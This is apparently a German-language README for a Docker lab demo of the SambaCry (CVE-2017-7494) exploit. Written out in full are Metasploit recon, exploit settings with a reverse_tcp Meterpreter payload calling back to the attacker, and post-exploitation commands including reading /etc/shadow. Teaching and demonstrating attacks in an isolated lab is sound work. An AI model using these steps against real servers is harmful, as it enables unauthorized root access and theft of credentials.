# Metasploit SMB-Demo

Live-Demo eines klassischen SMB-Exploits in einer isolierten Docker-Umgebung.

**Szenario:** Ein Angreifer entdeckt einen verwundbaren Samba-Server im Netz, exploited **SambaCry (CVE-2017-7494)** und bekommt eine Root-Meterpreter-Shell.

SambaCry wurde 2017 als "EternalRed" bezeichnet — die Linux-Variante von EternalBlue / WannaCry. Gleicher Kontext, gleiche Klasse: SMB-Schwachstelle, Remote Code Execution. Wir nehmen die Linux-Variante, weil sie sauber in Docker auf Apple Silicon läuft.

## Setup

```
┌──────────────┐         ┌──────────────┐
│   attacker   │ ──────▶ │    victim    │
│ 10.10.0.10   │   SMB   │ 10.10.0.20   │
│ Metasploit   │         │ Samba 4.3.8  │
└──────────────┘         └──────────────┘
        Docker-Netz: lab (10.10.0.0/24)
```

## Start

```sh
docker compose up -d        # beide Container im Hintergrund starten
docker attach msf-attacker  # an die laufende msfconsole hängen
```

`Ctrl-P Ctrl-Q` löst wieder ab, ohne die Konsole zu killen.

## Demo-Ablauf

### 1. Recon — was läuft im Netz?

In der `msfconsole`:

```
db_nmap -sV 10.10.0.20
```

`db_nmap` ist nmap, integriert in Metasploit — Ergebnisse landen direkt in der internen DB. `-sV` macht Service-/Versions-Erkennung. Wir sehen: Port 139 + 445 offen, Service `Samba smbd`.

### 2. Schwachstelle prüfen

```
use exploit/linux/samba/is_known_pipename
set RHOSTS 10.10.0.20
check
```

- `use ...` lädt das Exploit-Modul für SambaCry.
- `set RHOSTS` legt das Ziel fest (Remote Host).
- `check` testet **ohne anzugreifen**, ob das Ziel verwundbar aussieht.

→ `The target appears to be vulnerable.`

### 3. Exploit

```
set target 3
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.0.10
set SMB_SHARE_NAME share
set SMB_FOLDER /tmp
run
```

- `target 3` = Linux x86_64. Das ist die Architektur, die das Victim-Image fährt.
- `PAYLOAD ... reverse_tcp` = der Code, der auf dem Opfer ausgeführt wird. Meterpreter ist Metasploits feature-reicher Agent. **Reverse** = das Opfer baut die Verbindung zu uns auf (umgeht Firewalls leichter als ein Bind-Shell).
- `LHOST` = unsere IP, an die das Opfer zurückverbinden soll.
- `SMB_SHARE_NAME` / `SMB_FOLDER` = der schreibbare Share, in den der Exploit seine Schad-`.so` hochlädt, bevor Samba sie als Bibliothek lädt. Hier explizit gesetzt, weil das Auto-Detect-Verhalten nicht 100% deterministisch ist.
- `run` startet den Angriff.

→ Meterpreter-Session als **root**.

### 4. Post-Exploitation

In der Meterpreter-Session:

```
getuid          # zeigt: uid=0 root — wir sind root auf dem Opfer
sysinfo         # OS, Hostname, Architektur
shell           # in eine echte Shell auf dem Opfer wechseln
```

In der Shell:

```sh
cat /etc/shadow  # Passwort-Hashes — der "Beweis", dass wir wirklich root sind
ls /root         # ins Home-Verzeichnis von root schauen
```

Mit `exit` zurück in den Meterpreter, mit `background` zurück in die `msfconsole`.

## Stop

```sh
docker compose down  # stoppt und entfernt beide Container
```

## Hinweise

- Das Victim-Image ist `linux/amd64` und läuft auf Apple Silicon via Rosetta.
- Beide Container hängen nur am internen `lab`-Netz — keine Ports auf den Host gemappt.
- Die `STATUS_OBJECT_NAME_NOT_FOUND`-Meldungen im Exploit-Output sind normal: das Modul probiert mehrere Pipename-Varianten, eine davon greift.
